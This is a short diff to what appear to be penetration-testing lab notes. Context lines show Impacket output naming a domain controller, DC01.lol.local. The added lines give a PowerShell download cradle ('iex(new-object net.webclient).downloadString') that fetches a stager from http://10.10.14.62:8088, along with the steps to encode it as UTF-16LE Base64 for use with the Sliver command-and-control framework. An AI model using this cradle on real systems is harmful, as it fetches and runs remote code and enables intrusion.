@@ -84,3 +84,11 @@ Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies
 [+] DNS Host Name   : DC01.lol.local
 [+] OS              : 
 ```
+
+---
+
+By default, PowerShell uses UTF-16LE as encoding, but that is not always the case, so we must convert our payload to Base64 using the UTF-16LE encoding.
+```powershell
+echo -en "iex(new-object net.webclient).downloadString('http://10.10.14.62:8088/stager.txt')" | iconv -t UTF-16LE | base64 -w 0
+```
+this can be utilized with [[Sliver]]
